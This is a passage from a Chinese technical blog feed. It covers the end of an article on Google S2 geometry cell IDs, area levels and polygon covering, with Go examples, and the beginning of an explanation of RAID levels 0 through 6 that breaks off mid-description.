g(face,u,v) -&gt; h(face,s,t) -&gt; H(face,i,j) -&gt; CellID。目前总共转换了6步，球面经纬度坐标转换成球面xyz坐标，再转换成外切正方体投影面上的坐标，最后变换成修正后的坐标，再坐标系变换，映射到 [0,2^30^-1]区间，最后一步就是把坐标系上的点都映射到希尔伯特曲线上。</p><h3 id="4-6、-S2-Cell-ID-数据结构"><a href="#4-6、-S2-Cell-ID-数据结构" class="headerlink" title="4.6、 S2 Cell ID 数据结构"></a>4.6、 S2 Cell ID 数据结构</h3><p>最后需要来谈谈 S2 Cell ID 数据结构，这个数据结构直接关系到不同 Level 对应精度的问题。</p><p><img src="/assets/images/geohash-s2-64.png" alt="Level 30与Level 24的对比" loading="lazy"></p><p>上图左图中对应的是 Level 30 的情况，右图对应的是 Level 24 的情况。(2的多少次方，角标对应的也就是 Level 的值)</p><p>在 S2 中，每个 CellID 是由64位的组成的。可以用一个 uint64 存储。开头的3位表示正方体6个面中的一个，取值范围[0,5]。3位可以表示0-7，但是6，7是无效值。</p><p>64位的最后一位是1，这一位是特意留出来的。用来快速查找中间有多少位。从末尾最后一位向前查找，找到第一个不为0的位置，即找到第一个1。这一位的前一位到开头的第4位（因为前3位被占用）都是可用数字。</p><p>绿色格子有多少个就能表示划分多少格。上图左图，绿色的有60个格子，于是可以表示[0,2^30^ -1] * [0,2^30^ -1]这么多个格子。上图右图中，绿色格子只有48个，那么就只能表示[0,2^24^ -1]*[0,2^24^ -1]这么多个格子。</p><p>那么不同 level 可以代表的网格的面积究竟是多大呢？</p><p>由上一章我们知道，由于投影的原因，所以导致投影之后的面积依旧有大小差别。</p><p>这里推算的公式比较复杂，就不证明了，具体的可以看文档。</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">MinAreaMetric = Metric&#123;<span class="hljs-number">2</span>, <span class="hljs-number">8</span> * math.Sqrt2 / <span class="hljs-number">9</span>&#125; <br>AvgAreaMetric = Metric&#123;<span class="hljs-number">2</span>, <span class="hljs-number">4</span> * math.Pi / <span class="hljs-number">6</span>&#125; <br>MaxAreaMetric = Metric&#123;<span class="hljs-number">2</span>, <span class="hljs-number">2.635799256963161491</span>&#125;<br></code></pre></td></tr></table></figure><p>这就是最大最小面积和平均面积的倍数关系。</p><p>(下图单位是km^2^，平方公里)</p><p><img src="/assets/images/geohash-s2-65.png" alt="S2 Level面积" loading="lazy"></p><p><img src="/assets/images/geohash-s2-66.png" alt=" " loading="lazy"></p><p>level 0 就是正方体的六个面之一。地球表面积约等于510,100,000 km^2^。level 0 的面积就是地球表面积的六分之一。level 30 能表示的最小的面积0.48cm^2^，最大也就0.93cm^2^ 。</p><h3 id="4-7、-S2-与-Geohash-对比"><a href="#4-7、-S2-与-Geohash-对比" class="headerlink" title="4.7、 S2 与 Geohash 对比"></a>4.7、 S2 与 Geohash 对比</h3><p>Geohash 有12级，从5000km 到 3.7cm。中间每一级的变化比较大。有时候可能选择上一级会大很多，选择下一级又会小一些。比如选择字符串长度为4，它对应的 cell 宽度是39.1km，需求可能是50km，那么选择字符串长度为5，对应的 cell 宽度就变成了156km，瞬间又大了3倍了。这种情况选择多长的 Geohash 字符串就比较难选。选择不好，每次判断可能就还需要取出周围的8个格子再次进行判断。Geohash 需要 12 bytes 存储。</p><p>S2 有30级，从 0.7cm² 到 85,000,000km² 。中间每一级的变化都比较平缓，接近于4次方的曲线。所以选择精度不会出现 Geohash 选择困难的问题。S2 的存储只需要一个 uint64 即可存下。</p><p>S2 库里面不仅仅有地理编码，还有其他很多几何计算相关的库。地理编码只是其中的一小部分。本文没有介绍到的 S2 的实现还有很多很多，各种向量计算，面积计算，多边形覆盖，距离问题，球面球体上的问题，它都有实现。</p><p>S2 还能解决多边形覆盖的问题。比如给定一个城市，求一个多边形刚刚好覆盖住这个城市。</p><p><img src="/assets/images/geohash-s2-67.png" alt="多边形覆盖问题" loading="lazy"></p><p>如上图，生成的多边形刚刚好覆盖住下面蓝色的区域。这里生成的多边形可以有大有小。不管怎么样，最终的结果也是刚刚覆盖住目标物。</p><p><img src="/assets/images/geohash-s2-68.png" alt="多边形覆盖问题" loading="lazy"></p><p>用相同的 Cell 也可以达到相同的目的，上图就是用相同 Level 的 Cell 覆盖了整个圣保罗城市。</p><p>这些都是 Geohash 做不到的。</p><p>多边形覆盖利用的是近似的算法，虽然不是严格意义上的最优解，但是实践中效果特别好。</p><p>额外值得说明的一点是，Google 文档上强调了，这种多边形覆盖的算法虽然对搜索和预处理操作非常有用，但是“不可依赖”的。理由也是因为是近似算法，并不是唯一最优算法，所以得到的解会依据库的不同版本而产生变化。</p><h3 id="4-8、-S2-Cell-举例"><a href="#4-8、-S2-Cell-举例" class="headerlink" title="4.8、 S2 Cell 举例"></a>4.8、 S2 Cell 举例</h3><p>先来看看经纬度和 CellID 的转换，以及矩形面积的计算。</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">latlng := s2.LatLngFromDegrees(<span class="hljs-number">31.232135</span>, <span class="hljs-number">121.41321700000003</span>)<br>cellID := s2.CellIDFromLatLng(latlng)<br>cell := s2.CellFromCellID(cellID) <span class="hljs-comment">//9279882742634381312</span><br><br><span class="hljs-comment">// cell.Level()</span><br>fmt.Println(<span class="hljs-string">&quot;latlng = &quot;</span>, latlng)<br>fmt.Println(<span class="hljs-string">&quot;cell level = &quot;</span>, cellID.Level())<br>fmt.Printf(<span class="hljs-string">&quot;cell = %d\n&quot;</span>, cellID)<br>smallCell := s2.CellFromCellID(cellID.Parent(<span class="hljs-number">10</span>))<br>fmt.Printf(<span class="hljs-string">&quot;smallCell level = %d\n&quot;</span>, smallCell.Level())<br>fmt.Printf(<span class="hljs-string">&quot;smallCell id = %b\n&quot;</span>, smallCell.ID())<br>fmt.Printf(<span class="hljs-string">&quot;smallCell ApproxArea = %v\n&quot;</span>, smallCell.ApproxArea())<br>fmt.Printf(<span class="hljs-string">&quot;smallCell AverageArea = %v\n&quot;</span>, smallCell.AverageArea())<br>fmt.Printf(<span class="hljs-string">&quot;smallCell ExactArea = %v\n&quot;</span>, smallCell.ExactArea())<br></code></pre></td></tr></table></figure><p>这里 Parent 方法参数可以直接指定返回改点的对应 level 的 CellID。</p><p>上面那些方法打印出来的结果如下：</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">latlng =  [<span class="hljs-number">31.2321350</span>, <span class="hljs-number">121.4132170</span>]<br>cell level =  <span class="hljs-number">30</span><br>cell = <span class="hljs-number">3869277663051577529</span><br><br>****Parent **** <span class="hljs-number">10000000000000000000000000000000000000000</span><br>smallCell level = <span class="hljs-number">10</span><br>smallCell id = <span class="hljs-number">11010110110010011011110000000000000000000000000000000000000000</span><br>smallCell ApproxArea = <span class="hljs-number">1.9611002454714756e-06</span><br>smallCell AverageArea = <span class="hljs-number">1.997370817559429e-06</span><br>smallCell ExactArea = <span class="hljs-number">1.9611009480261058e-06</span><br></code></pre></td></tr></table></figure><p>再举一个覆盖多边形的例子。我们先随便创建一个区域。</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">rect = s2.RectFromLatLng(s2.LatLngFromDegrees(<span class="hljs-number">48.99</span>, <span class="hljs-number">1.852</span>))<br>rect = rect.AddPoint(s2.LatLngFromDegrees(<span class="hljs-number">48.68</span>, <span class="hljs-number">2.75</span>))<br><br>rc := &amp;s2.RegionCoverer&#123;MaxLevel: <span class="hljs-number">20</span>, MaxCells: <span class="hljs-number">10</span>, MinLevel: <span class="hljs-number">2</span>&#125;<br>r := s2.Region(rect.CapBound())<br>covering := rc.Covering(r)<br></code></pre></td></tr></table></figure><p>覆盖参数设置成 level 2 - 20，最多的 Cell 的个数是10个。</p><p><img src="/assets/images/geohash-s2-69.png" alt="10个Cell" loading="lazy"></p><p>接着我们把 Cell 至多改成20个。</p><p><img src="/assets/images/geohash-s2-70.png" alt="20个Cell" loading="lazy"></p><p>最后再改成30个。</p><p><img src="/assets/images/geohash-s2-71.png" alt="30个Cell" loading="lazy"></p><p>可以看到相同的 level 的范围，cell 个数越多越精确目标范围。</p><p>这里是匹配矩形区域，匹配圆形区域也同理。</p><p><img src="/assets/images/geohash-s2-72.png" alt="匹配圆形区域Cell为10" loading="lazy"></p><p><img src="/assets/images/geohash-s2-73.png" alt="匹配圆形区域Cell为100" loading="lazy"></p><p>代码就不贴了，与矩形类似。这种功能 Geohash 就做不到，需要自己手动实现了。</p><p>最后举一个多边形匹配的例子。</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">testLoop</span><span class="hljs-params">()</span></span> &#123;<br><br>ll1 := s2.LatLngFromDegrees(<span class="hljs-number">31.803269</span>, <span class="hljs-number">113.421145</span>)<br>ll2 := s2.LatLngFromDegrees(<span class="hljs-number">31.461846</span>, <span class="hljs-number">113.695803</span>)<br>ll3 := s2.LatLngFromDegrees(<span class="hljs-number">31.250756</span>, <span class="hljs-number">113.756228</span>)<br>ll4 := s2.LatLngFromDegrees(<span class="hljs-number">30.902604</span>, <span class="hljs-number">113.997927</span>)<br>ll5 := s2.LatLngFromDegrees(<span class="hljs-number">30.817726</span>, <span class="hljs-number">114.464846</span>)<br>ll6 := s2.LatLngFromDegrees(<span class="hljs-number">30.850743</span>, <span class="hljs-number">114.76697</span>)<br>ll7 := s2.LatLngFromDegrees(<span class="hljs-number">30.713884</span>, <span class="hljs-number">114.997683</span>)<br>ll8 := s2.LatLngFromDegrees(<span class="hljs-number">30.430111</span>, <span class="hljs-number">115.42615</span>)<br>ll9 := s2.LatLngFromDegrees(<span class="hljs-number">30.088491</span>, <span class="hljs-number">115.640384</span>)<br>ll10 := s2.LatLngFromDegrees(<span class="hljs-number">29.907713</span>, <span class="hljs-number">115.656863</span>)<br>ll11 := s2.LatLngFromDegrees(<span class="hljs-number">29.783833</span>, <span class="hljs-number">115.135012</span>)<br>ll12 := s2.LatLngFromDegrees(<span class="hljs-number">29.712295</span>, <span class="hljs-number">114.728518</span>)<br>ll13 := s2.LatLngFromDegrees(<span class="hljs-number">29.55473</span>, <span class="hljs-number">114.24512</span>)<br>ll14 := s2.LatLngFromDegrees(<span class="hljs-number">29.530835</span>, <span class="hljs-number">113.717776</span>)<br>ll15 := s2.LatLngFromDegrees(<span class="hljs-number">29.55473</span>, <span class="hljs-number">113.3772</span>)<br>ll16 := s2.LatLngFromDegrees(<span class="hljs-number">29.678892</span>, <span class="hljs-number">112.998172</span>)<br>ll17 := s2.LatLngFromDegrees(<span class="hljs-number">29.941039</span>, <span class="hljs-number">112.349978</span>)<br>ll18 := s2.LatLngFromDegrees(<span class="hljs-number">30.040949</span>, <span class="hljs-number">112.025882</span>)<br>ll19 := s2.LatLngFromDegrees(<span class="hljs-number">31.803269</span>, <span class="hljs-number">113.421145</span>)<br><br>point1 := s2.PointFromLatLng(ll1)<br>point2 := s2.PointFromLatLng(ll2)<br>point3 := s2.PointFromLatLng(ll3)<br>point4 := s2.PointFromLatLng(ll4)<br>point5 := s2.PointFromLatLng(ll5)<br>point6 := s2.PointFromLatLng(ll6)<br>point7 := s2.PointFromLatLng(ll7)<br>point8 := s2.PointFromLatLng(ll8)<br>point9 := s2.PointFromLatLng(ll9)<br>point10 := s2.PointFromLatLng(ll10)<br>point11 := s2.PointFromLatLng(ll11)<br>point12 := s2.PointFromLatLng(ll12)<br>point13 := s2.PointFromLatLng(ll13)<br>point14 := s2.PointFromLatLng(ll14)<br>point15 := s2.PointFromLatLng(ll15)<br>point16 := s2.PointFromLatLng(ll16)<br>point17 := s2.PointFromLatLng(ll17)<br>point18 := s2.PointFromLatLng(ll18)<br>point19 := s2.PointFromLatLng(ll19)<br><br>points := []s2.Point&#123;&#125;<br>points = <span class="hljs-built_in">append</span>(points, point19)<br>points = <span class="hljs-built_in">append</span>(points, point18)<br>points = <span class="hljs-built_in">append</span>(points, point17)<br>points = <span class="hljs-built_in">append</span>(points, point16)<br>points = <span class="hljs-built_in">append</span>(points, point15)<br>points = <span class="hljs-built_in">append</span>(points, point14)<br>points = <span class="hljs-built_in">append</span>(points, point13)<br>points = <span class="hljs-built_in">append</span>(points, point12)<br>points = <span class="hljs-built_in">append</span>(points, point11)<br>points = <span class="hljs-built_in">append</span>(points, point10)<br>points = <span class="hljs-built_in">append</span>(points, point9)<br>points = <span class="hljs-built_in">append</span>(points, point8)<br>points = <span class="hljs-built_in">append</span>(points, point7)<br>points = <span class="hljs-built_in">append</span>(points, point6)<br>points = <span class="hljs-built_in">append</span>(points, point5)<br>points = <span class="hljs-built_in">append</span>(points, point4)<br>points = <span class="hljs-built_in">append</span>(points, point3)<br>points = <span class="hljs-built_in">append</span>(points, point2)<br>points = <span class="hljs-built_in">append</span>(points, point1)<br><br>loop := s2.LoopFromPoints(points)<br><br>fmt.Println(<span class="hljs-string">&quot;----  loop search (gets too much) -----&quot;</span>)<br><span class="hljs-comment">// fmt.Printf(&quot;Some loop status items: empty:%t   full:%t \n&quot;, loop.IsEmpty(), loop.IsFull())</span><br><br><span class="hljs-comment">// ref: https://github.com/golang/geo/issues/14#issuecomment-257064823</span><br>defaultCoverer := &amp;s2.RegionCoverer&#123;MaxLevel: <span class="hljs-number">20</span>, MaxCells: <span class="hljs-number">1000</span>, MinLevel: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment">// rg := s2.Region(loop.CapBound())</span><br><span class="hljs-comment">// cvr := defaultCoverer.Covering(rg)</span><br>cvr := defaultCoverer.Covering(loop)<br><br><span class="hljs-comment">// fmt.Println(poly.CapBound())</span><br><span class="hljs-keyword">for</span> _, c3 := <span class="hljs-keyword">range</span> cvr &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d,\n&quot;</span>, c3)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里用到了 Loop 类，这个类的初始化的最小单元是 Point，Point 是由经纬度产生的。<strong>最重要的一点需要注意的是，多边形是按照逆时针方向，左手边区域确定的。</strong></p><p>如果一不小心点是按照顺时针排列的话，那么多边形确定的是外层更大的面，意味着球面除去画的这个多边形以外的都是你想要的多边形。</p><p>举个具体的例子，假如我们想要画的多边形是下图这个样子的：</p><p><img src="/assets/images/geohash-s2-74.png" alt="多边形示例" loading="lazy"></p><p>如果我们用顺时针的方式依次存储 Point 的话，并用顺时针的这个数组去初始化 Loop，那么就会出现“奇怪”的现象。如下图：</p><p><img src="/assets/images/geohash-s2-75.png" alt="多边形示例" loading="lazy"></p><p>这张图左上角的顶点和右下角的顶点在地球上是重合的。如果把这个地图重新还原成球面，那么就是整个球面中间挖空了一个多边形。</p><p>把上图放大，如下图：</p><p><img src="/assets/images/geohash-s2-76.png" alt="多边形示例" loading="lazy"></p><p>这样就可以很清晰的看到了，中间被挖空了一个多边形。造成这种现象的原因就是按照顺时针的方向存储了每个点，那么初始化一个 Loop 的时候就会选择多边形外圈的更大的多边形。</p><p>使用 Loop 一定要切记，<strong>顺时针表示的是外圈多边形，逆时针表示的是内圈多边形。</strong></p><p>多边形覆盖的问题同之前举的例子一样：</p><p>相同的 MaxLevel &#x3D; 20，MinLevel &#x3D; 1，MaxCells 不同，覆盖的精度就不同，下图是 MaxCells &#x3D; 100 的情况：</p><p><img src="/assets/images/geohash-s2-77.png" alt="多边形示例" loading="lazy"></p><p>下图是 MaxCells &#x3D; 1000 的情况：</p><p><img src="/assets/images/geohash-s2-78.png" alt="多边形示例" loading="lazy"></p><p>从这个例子也可以看出来 相同的 Level 范围，MaxCells 越精度，覆盖的精度越高。</p><h3 id="4-9、-S2-的应用"><a href="#4-9、-S2-的应用" class="headerlink" title="4.9、 S2 的应用"></a>4.9、 S2 的应用</h3><p><img src="/assets/images/geohash-s2-79.png" alt="空间" loading="lazy"></p><p>S2 主要能用在以下 8 个地方：</p><ol><li>涉及到角度，间隔，纬度经度点，单位矢量等的表示，以及对这些类型的各种操作。</li><li>单位球体上的几何形状，如球冠（“圆盘”），纬度 - 经度矩形，折线和多边形。</li><li>支持点，折线和多边形的任意集合的强大的构造操作（例如联合）和布尔谓词（例如，包含）。</li><li>对点，折线和多边形的集合进行快速的内存索引。</li><li>针对测量距离和查找附近物体的算法。</li><li>用于捕捉和简化几何的稳健算法（该算法具有精度和拓扑保证）。</li><li>用于测试几何对象之间关系的有效且精确的数学谓词的集合。</li><li>支持空间索引，包括将区域近似为离散“S2单元”的集合。此功能可以轻松构建大型分布式空间索引。</li></ol><p>最后一点空间索引相信在工业生产中使用的非常广泛。</p><p>S2 目前应用比较多，用在和地图相关业务上更多。Google Map 就直接大量使用了 S2 ，速度有多快读者可以自己体验体验。Uber 在搜寻最近的出租车也是用的 S2 算法进行计算的。场景的例子就是本篇文章引语里面提到的场景。滴滴应该也有相关的应用，也许有更加优秀的解法。现在很火的共享单车也会用到这些空间索引算法。</p><p>最后就是外卖行业和地图关联也很密切。美团和饿了么相信也在这方面有很多应用，具体哪里用到了，就请读者自己想象吧。</p><p>当然 S2 也有不适合的使用场景：</p><ul><li>平面几何问题（有许多精细的现有平面几何图库可供选择）；</li><li>转换常见的 to&#x2F;from GIS格式（要阅读这种格式，请使用<a href="http://gdal.org/1.11/ogr/">OGR</a>等外部库）；</li></ul><h2 id="五、-最后"><a href="#五、-最后" class="headerlink" title="五、 最后"></a>五、 最后</h2><p><img src="/assets/images/geohash-s2-80.png" alt="最后" loading="lazy"></p><p>本篇文章里面着重介绍了谷歌的 S2 算法的基础实现。虽然 Geohash 也是空间点索引算法，但是性能方面比谷歌的 S2 略逊一筹。并且大公司的数据库也基本上开始采用谷歌的 S2 算法进行索引。</p><p>关于空间搜索其实还有一大类问题，如何搜索多维空间线，多维空间面，多维空间多边形呢？他们都是由无数个空间点组成的。实际的例子，比如街道，高楼，铁路，河流。要搜索这些东西，数据库表如何设计？如何做到高效的搜索呢？还能用 B+ 树来做么？</p><p>答案当然是也可以实现高效率的搜索，那就需要用到 R 树，或者 R 树 和 B+树。</p><p>这部分就不在本文的范畴内了，下次有空可以再分享一篇《多维空间多边形索引算法》</p><p>最后，请大家多多指点。</p><hr><p>Reference：<br><a href="https://en.wikipedia.org/wiki/Z-order_curve">Z-order curve</a><br><a href="https://en.wikipedia.org/wiki/Geohash">Geohash wikipedia</a><br><a href="https://en.wikipedia.org/wiki/Geohash-36">Geohash-36</a><br><a href="http://geohash.gofreerange.com/">Geohash 在线演示</a><br><a href="http://www.movable-type.co.uk/scripts/geohash.html">Geohash 查询</a><br><a href="http://geohash.co/">Geohash Converter</a><br><a href="https://en.wikipedia.org/wiki/Space-filling_curve">Space-filling curve</a><br><a href="https://en.wikipedia.org/wiki/List_of_fractals_by_Hausdorff_dimension">List of fractals by Hausdorff dimension</a><br><a href="https://www.youtube.com/watch?v=3s7h2MHQtxc">介绍希尔伯特曲线的Youtube视频</a><br><a href="http://bit-player.org/extras/hilbert/hilbert-mapping.html">希尔伯特曲线在线演示</a><br><a href="http://www4.ncsu.edu/~njrose/pdfFiles/HilbertCurve.pdf">希尔伯特曲线论文</a><br><a href="http://bit-player.org/2013/mapping-the-hilbert-curve">Mapping the Hilbert curve</a><br><a href="https://docs.google.com/presentation/d/1Hl4KapfAENAOf4gv-pSngKwvS_jwNVHRPZTTDzXXn6Q/view#slide=id.i22">S2 谷歌官方PPT</a><br><a href="https://github.com/golang/geo"> Go 版 S2 源码 github.com&#x2F;golang&#x2F;geo</a><br><a href="https://github.com/google/s2-geometry-library-java"> Java 版 S2 源码 github.com&#x2F;google&#x2F;s2-geometry-library-java</a><br><a href="http://numerical.recipes/whp/HuiliersTheorem.pdf">L’Huilier’s Theorem</a></p><p>本文转自：<a href="https://halfrost.com/go_spatial_search/">https://halfrost.com/go_spatial_search/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> GeoHash </tag>
            
            <tag> Google S2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RAID技术的对比解析</title>
      <link href="/2019/11/25/raidX/"/>
      <url>/2019/11/25/raidX/</url>
      
        <content type="html"><![CDATA[<p><a href="https://en.wikipedia.org/wiki/David_Patterson_(computer_scientist)">D. A. Patterson</a> 教授等人于1988年首次在论文 <a href="https://www.cs.cmu.edu/~garth/RAIDpaper/Patterson88.pdf">A Case of Redundant Array of Inexpensive Disks</a> 中提出了RAID概念，即廉价冗余磁盘阵列（ Redundant Array of Inexpensive Disks ）。 RAID 的基本思想是将多个容量较小、相对廉价的磁盘进行有机组合，从而以较低的成本获得与昂贵大容量磁盘相当的容量、性能和可靠性。随着磁盘成本和价格的不断降低， RAID概念中的廉价已经毫无意义。因此， RAID 咨询委员会（ RAID Advisory Board, RAB ）决定用<code>独立</code>替代<code>廉价</code> ，于时 RAID 变成了独立磁盘冗余阵列（ Redundant Array of Independent Disks ）。这里介绍了几种 RAID 的部署结构：RAID 0，RAID 1，RAID 2，RAID 3，RAID 4，RAID 5，RAID 6，RAID 7，RAID 01，RAID 10，RAID 30&#x2F;53，RAID 50，RAID 60，RAID 100。</p><p><a href="https://en.wikipedia.org/wiki/David_Patterson_(computer_scientist)">D. A. Patterson</a> 等的论文中定义了 <code>RAID1</code> ~ <code>RAID5</code> 原始 <code>RAID</code> 等级， 1988 年以来又扩展了 <code>RAID0</code> 和 <code>RAID6</code> 。近年来，存储厂商不断推出诸如 <code>RAID7</code> 、 <code>RAID10/01</code> 、 <code>RAID50</code> 、 <code>RAID53</code> 、 <code>RAID100</code> 等 <code>RAID</code> 等级。但这些并无统一的标准。目前业界公认的标准是 <code>RAID0</code> ~ <code>RAID5</code> ，除 <code>RAID2</code> 外的四个等级被定为工业标准，而在实际应用领域中使用最多的 RAID 等级是 <code>RAID0</code> 、 <code>RAID1</code> 、 <code>RAID3</code> 、 <code>RAID5</code> 、 <code>RAID6</code> 和 <code>RAID10</code>。</p><h2 id="一、RAID-0"><a href="#一、RAID-0" class="headerlink" title="一、RAID 0"></a>一、RAID 0</h2><p><code>RAID 0</code>实际上并没有提供任何冗余，它只是将多个磁盘组成一个大容量的磁盘。使用<code>RAID 0</code>后，多个磁盘可以同时读写，所以提高了磁盘的读写性能。<code>RAID 0</code>至少需要两块磁盘。</p><ul><li><p>优点：</p><ul><li>可以将多个磁盘当成一个大容量的磁盘来使用；</li><li>读写性能有极大的提高；</li></ul></li><li><p>缺点：</p><ul><li>增加了数据的丢失风险，一旦阵列中的一块磁盘故障，整个阵列的数据将无法恢复；</li><li>不建议将其作为系统盘，也不建议用来保存有价值的数据；</li></ul></li></ul><img src="/assets/images/raid-0.png" alt="RAID 0" style="zoom:50%;" /><h2 id="二、RAID-1"><a href="#二、RAID-1" class="headerlink" title="二、RAID 1"></a>二、RAID 1</h2><p><code>RAID 1</code>在写入数据的时候，会同时将数据写入<code>工作盘</code>和<code>镜像盘</code>，每一个<code>工作盘</code>都有一个对应的<code>镜像盘</code>，<code>工作盘</code>和<code>镜像盘</code>保存的数据内容是完全一样的。当<code>工作盘</code>发生故障时，可以从<code>镜像盘</code>读取数据。显然，使用<code>RAID 1</code>后，磁盘的利用率为<code>50%</code>，即有效存储空间变成原来的一半了。<code>RAID 1</code>至少需要两块磁盘。</p><ul><li><p>优点：</p><ul><li>读取速度有极大的提高（有时甚至比<code>RAID 0</code>更高）；</li><li>通过镜像的方式提供了<code>冗余</code>功能；</li></ul></li><li><p>缺点：</p><ul><li>与<code>RAID 0</code>相比，<code>RAID 1</code>的写速度较低；</li><li>通过镜像的方式提供冗余功能，意味着在冗余上花费了很多成本；</li></ul></li></ul><img src="/assets/images/raid-1.png" alt="RAID 1" style="zoom:50%;" /><h2 id="三、RAID-2"><a href="#三、RAID-2" class="headerlink" title="三、RAID 2"></a>三、RAID 2</h2><p><code>RAID 2</code> 称为<code>纠错海明码磁盘阵列</code>，其设计思想是利用<code>海明码</code>实现数据校验冗余。<code>海明码</code>是一种在原始数据中加入若干校验码来进行错误检测和纠正的编码技术，其中第 <code>2n</code> 位（ 1, 2, 4, 8, … ）是<code>校验码</code>，其他位置是<code>数据码</code>。因在 <code>RAID 2</code> 中，数据按位存储，每块磁盘存储<code>一位</code>数据编码，磁盘数量取决于所设定的<code>数据存储宽度</code>，可由用户设定。下图中展示了数据宽度为 <code>4</code> 的 <code>RAID 2</code> ，它需要 <code>4</code> 块<code>数据盘</code>和 <code>3</code> 块<code>校验盘</code>。如果是 <code>64 位数据宽度</code>，则需要 <code>64 块数据盘</code>和 <code>7 块校验盘</code>。可见， <code>RAID2</code> 的数据宽度越大，存储空间利用率越高，但同时需要的磁盘数量也越多。</p><ul><li><p>优点：</p><ul><li>海明码自身具备纠错能力，可以在数据发生错误的情况下对纠正错误，保证数据的安全性；</li><li>数据传输性能相当高，设计复杂性要低于 <code>RAID 3</code> 、 <code>RAID 4</code> 和 <code>RAID 5</code> ；</li></ul></li><li><p>缺点：</p><ul><li>海明码的数据冗余开销太大，数据输出性能受阵列中最慢磁盘驱动器的限制；</li><li>海明码是按位运算，数据重建非常耗时；</li><li>大部分磁盘驱动器本身都具备了纠错功能，<code>RAID 2</code>使用海明码的数据纠错功能略显多余；</li><li><code>RAID2</code> 在实际中很少应用，没有形成商业产品，目前主流存储磁盘阵列均不提供 <code>RAID2</code> 支持；</li></ul></li></ul><img src="/assets/images/raid-2.png" alt="RAID 2" style="zoom:50%;" /><h2 id="四、RAID-3"><a href="#四、RAID-3" class="headerlink" title="四、RAID 3"></a>四、RAID 3</h2><p><code>RAID 3</code>使用<code>专用校验盘</code>的<code>并行访问阵列</code>，它采用一个专用的磁盘作为<code>校验盘</code>，其余磁盘作为<code>数据盘</code>，数据以位或字节为单位进行分割存储在各个数据盘中。<code>RAID 3</code>至少需要<code>三块磁盘</code>，不同磁盘上同一带区的数据作 <code>XOR 校验</code>，校验值写入<code>校验盘</code>中。</p><ul><li>优点：<ul><li>磁盘状态完好时，读性能与<code>RAID 0</code>完全一致，并行从多个磁盘条带读取数据，性能非常高，同时还提供了<code>数据容错</code>能力；</li><li>某一磁盘出现故障，不会影响数据读取，可以借助校验数据和其他完好数据来重建数据；</li><li>校验盘只需要一个，阵列的存储空间利用率高，并且由于并行访问的特征，能够高性能的高带宽的大量读写；</li><li>适用大容量数据的顺序访问应用，如影像处理、流媒体服务等；</li></ul></li><li>缺点：<ul><li>写入数据时，必须计算与所有同条带的校验值，并将新校验值写入校验盘中，一次写操作包含了写数据块、读取同条带的数据块、计算校验值、写入校验值等多个操作，系统开销大，性能低；</li><li>出现坏盘时性能会大幅下降；</li></ul></li></ul><img src="/assets/images/raid-3.png" alt="RAID 3" style="zoom:50%;" /><h2 id="五、RAID-4"><a href="#五、RAID-4" class="headerlink" title="五、RAID 4"></a>五、RAID 4</h2><p><code>RAID 4</code> 与 <code>RAID 3</code>的原理大致相同，区别在于<code>条带化</code>的方式不同。 <code>RAID 4</code>按照<code>块方式</code>来组织数据，写操作只涉及当前<code>数据盘</code>和<code>校验盘</code>两个盘，多个 I&#x2F;O 请求可以同时得到处理，提高了系统性能。<code>RAID 4</code>在不同磁盘上的同级数据块同样使用<code>XOR校验</code>，结果存储在校验盘中。写入数据时， <code>RAID 4</code>按这种方式把各磁盘上的同级数据的校验值写入校验盘，读取时进行即时校验。因此，当某块磁盘的数据块损坏， <code>RAID 4</code>可以通过校验值以及其他磁盘上的同级数据块进行数据重建。</p><ul><li>优点：<ul><li>按块存储可以保证单块的完整性，可以避免受到其他磁盘上同条带产生的不利影响；</li><li>多个<code>I/O</code>请求可以同时得到处理，提供了非常好的读性能；</li></ul></li><li>缺点：<ul><li>对于写操作， <code>RAID 4</code>只能一个磁盘一个磁盘地写，并且还要写入校验数据，因此写性能比较差；</li><li>实际应用中很少见，主流存储产品也很少使用<code>RAID 4</code>保护；</li><li>随着成员磁盘数量的增加，单一校验盘的瓶颈会十分突出，往往容易成为系统性能的瓶颈；</li></ul></li></ul><img src="/assets/images/raid-4.png" alt="RAID 4" style="zoom:50%;" /><h2 id="六、RAID-5"><a href="#六、RAID-5" class="headerlink" title="六、RAID 5"></a>六、RAID 5</h2><p><code>RAID 5</code>使用<code>奇偶校验数据</code>来保障数据的恢复。通过将一个（假设为A）磁盘的校验数据保存在另一个（假设为B）磁盘上，使得在如果<code>磁盘A</code>发生了故障，则可以通过<code>磁盘B</code>上保存的校验数据恢复。显然<code>RAID 5</code>在单个磁盘发生故障时，可以恢复数据。RAID 5至少需要三块磁盘。</p><ul><li>优点：<ul><li>提供类似<code>RAID 0</code>的读取速度；</li><li>提供单个磁盘故障的恢复能力；</li><li>磁盘空间利用率要比<code>RAID 1</code>高，存储成本相对较低，是目前运用较多的一种解决方案；</li></ul></li><li>缺点：<ul><li>由于需要进行奇偶校验，所以写入数据的速度比对单个磁盘进行写入操作慢；</li><li>磁盘阵列的容量必须一样大，当容量不同时，会以最小的容量为准；</li></ul></li></ul><img src="/assets/images/raid-5.png" alt="RAID 5" style="zoom:50%;" /><h2 id="七、RAID-6"><a href="#七、RAID-6" class="headerlink" title="七、RAID 6"></a>七、RAID 6</h2><p><code>RAID 6</code> 引入了<code>双重校验</code>的概念，它可以保护阵列中同时出现两个磁盘失效时，阵列仍能够继续工作，不会发生数据丢失。 <code>RAID 6</code>是在<code>RAID 5</code>的基础上为了进一步增强数据保护而设计的一种 <code>RAID</code> 方式，它可以看作是一种扩展的<code>RAID 5</code> 等级。<code>RAID 6</code>思想最常见的实现方式是采用两个独立的校验算法，假设称为<code>P</code>和<code>Q</code> 